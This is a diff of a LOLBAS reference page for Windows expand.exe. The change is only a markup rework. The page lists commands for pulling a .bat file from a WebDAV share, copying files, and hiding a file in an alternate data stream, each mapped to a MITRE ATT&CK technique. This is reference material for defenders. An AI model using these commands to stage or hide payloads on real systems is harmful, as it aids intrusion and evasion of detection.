@@ -28,21 +28,25 @@
     </div>
 </h1>
 
-
 <ul class="function-list">
-    
-    
-    <li><a href="/lolbas/Binaries/Expand/#download">Download</a></li>
-    
-    
-    <li><a href="/lolbas/Binaries/Expand/#copy">Copy</a></li>
-    
-    
-    <li><a href="/lolbas/Binaries/Expand/#ads">Alternate data streams</a></li>
-    
+	
+	
+	
+	<li><a href="/lolbas/Binaries/Expand/#download">Download</a></li>
+	
+	
+	<li><a href="/lolbas/Binaries/Expand/#copy">Copy</a></li>
+	
+	
+	<li><a href="/lolbas/Binaries/Expand/#ads">Alternate data streams</a></li>
+	
 </ul>
 
+	
+
 <p>Binary that expands one or more compressed files</p>
+
+
 
 <br>
 <p><b>Paths:</b> 
@@ -56,124 +60,94 @@
 </p>
 <br>
 <b>Resources:</b> 	
-	<ul style="list-style-type:none">
+<br>
 	
-	<li><a href="https://twitter.com/infosecn1nja/status/986628482858807297">https://twitter.com/infosecn1nja/status/986628482858807297</a></li>
+	<a href="https://twitter.com/infosecn1nja/status/986628482858807297">https://twitter.com/infosecn1nja/status/986628482858807297</a>
+	<br>
 	
-	<li><a href="https://twitter.com/Oddvarmoe/status/986709068759949319">https://twitter.com/Oddvarmoe/status/986709068759949319</a></li>
+	<a href="https://twitter.com/Oddvarmoe/status/986709068759949319">https://twitter.com/Oddvarmoe/status/986709068759949319</a>
+	<br>
 	 
-	</ul>
 <br>
 <p><b>Acknowledgement:</b> 
-	<ul style="list-style-type:none">
+<br>
 	
-	<li>Rahmat Nurfauzi - <a href="https://twitter.com/@infosecn1nja">@infosecn1nja</a </li>
+	Rahmat Nurfauzi - <a href="https://twitter.com/@infosecn1nja">@infosecn1nja</a>
+	<br>
 	
-	<li>Oddvar Moe - <a href="https://twitter.com/@oddvarmoe">@oddvarmoe</a </li>
+	Oddvar Moe - <a href="https://twitter.com/@oddvarmoe">@oddvarmoe</a>
+	<br>
 	 
-	</ul>
 </p>
 <br>
-<p><b>Detection:</b> 
-	<ul style="list-style-type:none">
+<p><b>Detection:</b>
+<br>
 	
-	<li></li>
+	
+	<br>
 	 
-	</ul>
 </p>
 <br>
 <br>
 
 
 
-
-
-
-<h2 id="download" class="function-name">Download</h2>
-
-<p>The LOLBAS can download files.</p>
-
-
-<ul class="examples">
-
-    
-
-
-
-    <li>
-        <p>Copies source file to destination.</p>
-
+	
+<h2 id="download" class ="function-name">Download</h2>
+	
+		Copies source file to destination.
+		<br>
+		<pre><code>expand \\webdav\folder\file.bat c:\ADS\file.bat</code></pre>
 		Usecase:Use to copies the source file to the destination file
-        <pre><code>expand \\webdav\folder\file.bat c:\ADS\file.bat</code></pre>
-    </li>
-	<li>Privileges required:User</li>
-	<li>OS:Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10</li>
-	<li>Mitre:<a href="https://attack.mitre.org/wiki/Technique/T1105">T1105</a></li>
-	<br><br>	
-    
+		<br>
+		Privileges required:User
+		<br>
+		OS:Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10
+		<br>
+		Mitre:<a href="https://attack.mitre.org/wiki/Technique/T1105">T1105</a>
+		<br>
+		<br>
+		<br>
+		<br>
+	
 
-</ul>
-<br><br>
-
-
-
-
-
-<h2 id="copy" class="function-name">Copy</h2>
-
-<p>The LOLBAS can copy file.</p>
-
-
-<ul class="examples">
-
-    
-
-
-
-    <li>
-        <p>Copies source file to destination.</p>
-
+	
+<h2 id="copy" class ="function-name">Copy</h2>
+	
+		Copies source file to destination.
+		<br>
+		<pre><code>expand c:\ADS\file1.bat c:\ADS\file2.bat</code></pre>
 		Usecase:Copies files from A to B
-        <pre><code>expand c:\ADS\file1.bat c:\ADS\file2.bat</code></pre>
-    </li>
-	<li>Privileges required:User</li>
-	<li>OS:Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10</li>
-	<li>Mitre:<a href="https://attack.mitre.org/wiki/Technique/T1105">T1105</a></li>
-	<br><br>	
-    
+		<br>
+		Privileges required:User
+		<br>
+		OS:Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10
+		<br>
+		Mitre:<a href="https://attack.mitre.org/wiki/Technique/T1105">T1105</a>
+		<br>
+		<br>
+		<br>
+		<br>
+	
 
-</ul>
-<br><br>
-
-
-
-
-
-<h2 id="ads" class="function-name">Alternate data streams</h2>
-
-<p>The LOLBAS can write or read alternate data streams.</p>
-
-
-<ul class="examples">
-
-    
-
-
-
-    <li>
-        <p>Copies source file to destination Alternate Data Stream (ADS)</p>
-
+	
+<h2 id="ads" class ="function-name">Alternate data streams</h2>
+	
+		Copies source file to destination Alternate Data Stream (ADS)
+		<br>
+		<pre><code>expand \\webdav\folder\file.bat c:\ADS\file.txt:file.bat</code></pre>
 		Usecase:Copies files from A to B
-        <pre><code>expand \\webdav\folder\file.bat c:\ADS\file.txt:file.bat</code></pre>
-    </li>
-	<li>Privileges required:User</li>
-	<li>OS:Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10</li>
-	<li>Mitre:<a href="https://attack.mitre.org/wiki/Technique/T1096">T1096</a></li>
-	<br><br>	
-    
-
-</ul>
-<br><br>
+		<br>
+		Privileges required:User
+		<br>
+		OS:Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10
+		<br>
+		Mitre:<a href="https://attack.mitre.org/wiki/Technique/T1096">T1096</a>
+		<br>
+		<br>
+		<br>
+		<br>
+	
 
         <script>
          // add permalink on headings
